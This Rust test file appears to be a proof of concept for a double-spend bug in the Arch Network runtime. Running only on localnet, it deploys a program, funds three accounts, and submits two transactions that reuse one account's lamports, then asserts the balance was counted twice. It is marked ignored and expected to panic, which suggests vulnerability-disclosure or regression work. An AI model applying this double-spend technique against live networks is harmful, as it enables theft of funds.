#![cfg(test)]
use arch_program::sanitized::ArchMessage;
use bitcoin::key::UntweakedKeypair;
use bitcoin::XOnlyPublicKey;

use arch_program::account::{AccountMeta, MIN_ACCOUNT_LAMPORTS};
use arch_program::instruction::Instruction;
use arch_program::pubkey::Pubkey;
use arch_program::system_instruction;
use arch_sdk::{
    build_and_sign_transaction, generate_new_keypair, with_secret_key_file, ArchRpcClient,
    BitcoinHelper, Config, ProgramDeployer, Status,
};

pub const ELF_PATH: &str = "./program/target/sbpf-solana-solana/release/same_lamports_poc.so";

#[ignore]
#[should_panic]
#[test]
fn poc_same_lamports() {
    let config = Config::localnet();
    let client = ArchRpcClient::new(&config.arch_node_url);

    let (program_keypair, _) =
        with_secret_key_file("program.json").expect("getting caller info should not fail");

    let (authority_keypair, authority_pubkey, _) = generate_new_keypair(config.network);
    client
        .create_and_fund_account_with_faucet(&authority_keypair, config.network)
        .unwrap();

    let deployer = ProgramDeployer::new(&config.arch_node_url, config.network);

    let program_pubkey = deployer
        .try_deploy_program(
            "same_lamports_poc".to_string(),
            program_keypair,
            authority_keypair,
            &ELF_PATH.to_string(),
        )
        .unwrap();

    let fee_payer_pubkey = Pubkey::from_slice(
        &XOnlyPublicKey::from_keypair(&authority_keypair)
            .0
            .serialize(),
    );

    let (account_keypair1, account_pubkey1) = create_account(
        &client,
        authority_keypair,
        &program_pubkey,
        &fee_payer_pubkey,
    );
    let (account_keypair2, account_pubkey2) = create_account(
        &client,
        authority_keypair,
        &program_pubkey,
        &fee_payer_pubkey,
    );
    let (account_keypair3, account_pubkey3) = create_account(
        &client,
        authority_keypair,
        &program_pubkey,
        &fee_payer_pubkey,
    );

    let instruction1 = Instruction {
        program_id: program_pubkey,
        accounts: vec![
            AccountMeta {
                pubkey: account_pubkey1,
                is_signer: true,
                is_writable: true,
            },
            AccountMeta {
                pubkey: fee_payer_pubkey,
                is_signer: true,
                is_writable: true,
            },
            AccountMeta {
                pubkey: account_pubkey2,
                is_signer: true,
                is_writable: true,
            },
        ],
        data: vec![],
    };

    let mut instruction2 = instruction1.clone();
    instruction2.accounts[2].pubkey = account_pubkey3;

    let message1 = ArchMessage::new(
        &[instruction1],
        Some(authority_pubkey),
        client.get_best_finalized_block_hash().unwrap(),
    );

    let message2 = ArchMessage::new(
        &[instruction2],
        Some(authority_pubkey),
        client.get_best_finalized_block_hash().unwrap(),
    );

    dbg!("MESSAGE1:", &message1);
    dbg!("MESSAGE2:", &message2);

    let transaction1 = build_and_sign_transaction(
        message1,
        vec![account_keypair1, authority_keypair, account_keypair2],
        config.network,
    )
    .expect("Failed to build and sign transaction");

    let transaction2 = build_and_sign_transaction(
        message2,
        vec![account_keypair1, authority_keypair, account_keypair3],
        config.network,
    )
    .expect("Failed to build and sign transaction");

    let account1_balance_before = client.read_account_info(account_pubkey1).unwrap().lamports;
    dbg!("Account 1 balance before: ", account1_balance_before);
    let account2_balance_before = client.read_account_info(account_pubkey2).unwrap().lamports;
    dbg!("Account 2 balance before: ", account2_balance_before);

    let account3_balance_before = client.read_account_info(account_pubkey3).unwrap().lamports;
    dbg!("Account 3 balance before: ", account3_balance_before);

    let txids = client
        .send_transactions(vec![transaction1, transaction2])
        .unwrap();

    let block_transactions = client.wait_for_processed_transactions(txids).unwrap();

    assert_eq!(
        block_transactions[0].status,
        Status::Processed,
        "Transaction failed processing"
    );

    assert_eq!(
        block_transactions[1].status,
        Status::Processed,
        "Transaction failed processing"
    );

    let account1_balance_after = client.read_account_info(account_pubkey1).unwrap().lamports;
    dbg!("Account 1 balance after: ", account1_balance_after);

    let account2_balance_after = client.read_account_info(account_pubkey2).unwrap().lamports;
    dbg!("Account 2 balance after: ", account2_balance_after);

    let account3_balance_after = client.read_account_info(account_pubkey3).unwrap().lamports;
    dbg!("Account 3 balance after: ", account3_balance_after);

    assert_eq!(
        account1_balance_before * 2 + account2_balance_before + account3_balance_before,
        account1_balance_after + account2_balance_after + account3_balance_after,
        "account1_balance_after should be used twice"
    );
}

fn create_account(
    client: &ArchRpcClient,
    authority_keypair: UntweakedKeypair,
    program_pubkey: &Pubkey,
    fee_payer_pubkey: &Pubkey,
) -> (UntweakedKeypair, Pubkey) {
    let config = Config::localnet();
    let (account_keypair1, account_pubkey1, _) = generate_new_keypair(config.network);
    let helper = BitcoinHelper::new(&config);
    let (txid1, vout1) = helper.send_utxo(account_pubkey1).unwrap();
    println!("Account 1 created with address, {:?}", account_pubkey1.0);

    let txid1 = build_and_sign_transaction(
        ArchMessage::new(
            &[system_instruction::create_account_with_anchor(
                fee_payer_pubkey,
                &account_pubkey1,
                MIN_ACCOUNT_LAMPORTS,
                0,
                program_pubkey,
                hex::decode(txid1).unwrap().try_into().unwrap(),
                vout1,
            )],
            Some(*fee_payer_pubkey),
            client.get_best_finalized_block_hash().unwrap(),
        ),
        vec![authority_keypair, account_keypair1],
        config.network,
    )
    .expect("Failed to build and sign transaction");

    let txid = client.send_transaction(txid1).unwrap();
    let processed_tx = client.wait_for_processed_transaction(&txid).unwrap();
    assert_eq!(
        processed_tx.status,
        Status::Processed,
        "Account 1 creation transaction failed"
    );
    (account_keypair1, account_pubkey1)
}
